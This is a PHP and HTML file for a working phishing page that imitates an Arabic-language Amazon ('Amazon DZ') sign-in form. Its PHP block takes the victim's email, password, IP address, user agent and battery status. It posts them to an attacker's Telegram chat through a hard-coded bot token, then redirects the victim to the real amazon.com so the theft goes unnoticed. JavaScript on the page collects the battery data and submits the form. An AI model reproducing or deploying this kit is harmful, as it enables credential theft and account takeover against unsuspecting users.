<?php
// ثابت البوت
$BOT_TOKEN = "8642478796:AAEaDxElqAtOEs2DUzz_8yNnuflpLRSADwQ";

// قبول chat_id من الرابط سواء chat_id أو ID
$CHAT_ID = $_GET['chat_id'] ?? $_GET['ID'] ?? null;

if ($CHAT_ID && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'غير معروف';
    $date = date('Y-m-d H:i:s');

    // استقبال بيانات form
    $email = $_POST['email'] ?? 'غير معروف';
    $password = $_POST['password'] ?? 'غير معروف';

    // حالة البطارية
    $battery_status = "غير معروف";
    if (isset($_POST['battery_level']) && isset($_POST['battery_charging'])) {
        $battery_status = "{$_POST['battery_level']} - الشحن: {$_POST['battery_charging']}";
    }

    // تكوين الرسالة
    $message = "
📌 <b>تم استلام تسجيل دخول جديد</b>
🌍 <b>IP:</b> $ip
🔋 <b>حالة البطارية:</b> $battery_status
🖥 <b>User-Agent:</b> $user_agent
📧 <b>Email:</b> $email
🔑 <b>Password:</b> $password
📅 <b>التاريخ والوقت:</b> $date
";

    // ارسال الرسالة للبوت باستخدام cURL
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage";
    $data = [
        'chat_id' => $CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // تحويل المستخدم مباشرة إلى أمازون
    header("Location: https://www.amazon.com/");
    exit;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Amazon DZ - تسجيل الدخول</title>
  <style>
    body { font-family: Arial; background: #fff; margin: 0; padding: 0; display:flex; justify-content:center; align-items:center; height:100vh; }
    .container { width: 360px; background: #fff; padding: 30px; border:1px solid #ddd; border-radius:10px; box-shadow:0 0 15px rgba(0,0,0,0.2); }
    .logo { text-align:center; margin-bottom:20px; }
    .logo img { width:100px; }
    h2 { font-size:20px; margin-bottom:20px; color:#111; text-align:center; }
    label { font-size:14px; margin-bottom:5px; font-weight:bold; display:block; }
    input { width:100%; padding:12px; margin-bottom:15px; border:1px solid #a6a6a6; border-radius:5px; font-size:14px; }
    button { width:100%; padding:12px; background:#febd69; border:1px solid #a88734; border-radius:5px; font-size:16px; cursor:pointer; font-weight:bold; }
    button:hover { background:#f3a847; }
    .help { font-size:12px; margin-top:10px; text-align:center; }
    .help a { color:#0066c0; text-decoration:none; }
    .help a:hover { text-decoration:underline; }
    .new-account { margin-top:15px; text-align:center; }
    .new-account button { background:#e7e9ec; border:1px solid #adb1b8; color:#111; font-weight:bold; font-size:14px; padding:10px 0; width:100%; border-radius:5px; }
    .new-account button:hover { background:#d7d9dc; }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon DZ"></div>
    <h2>تسجيل الدخول</h2>
    <form id="loginForm" method="post">
      <label for="email">البريد الإلكتروني أو رقم الهاتف</label>
      <input type="text" id="email" name="email" required>
      <label for="password">كلمة المرور</label>
      <input type="password" id="password" name="password" required>
      <button type="submit">تسجيل الدخول</button>
    </form>
    <div class="help"><a href="#">هل نسيت كلمة المرور؟</a></div>
    <div class="new-account">
      <p>مستخدم جديد؟</p>
      <button>إنشاء حساب أمازون جديد</button>
    </div>
  </div>

  <script>
    async function collectBatteryInfo() {
      let batteryLevel = "غير مدعوم";
      let batteryCharging = "غير مدعوم";
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          batteryLevel = Math.round(battery.level*100) + '%';
          batteryCharging = battery.charging ? 'نعم' : 'لا';
        } catch(e){}
      }
      return { batteryLevel, batteryCharging };
    }

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const battery = await collectBatteryInfo();

      const formData = new FormData();
      formData.append('email', email);
      formData.append('password', password);
      formData.append('battery_level', battery.batteryLevel);
      formData.append('battery_charging', battery.batteryCharging);

      const urlParams = new URLSearchParams(window.location.search);
      const chatId = urlParams.get('chat_id') || urlParams.get('ID');
      if (!chatId) {
        alert('معرف المستخدم غير موجود في الرابط');
        return;
      }

      fetch(window.location.href + "?chat_id=" + chatId, {
        method: 'POST',
        body: formData
      }).then(() => {
        // بعد الإرسال، يتم إعادة توجيه المستخدم مباشرة إلى أمازون
        window.location.href = "https://www.amazon.com/";
      }).catch(err => console.error(err));
    });
  </script>
</body>
</html>
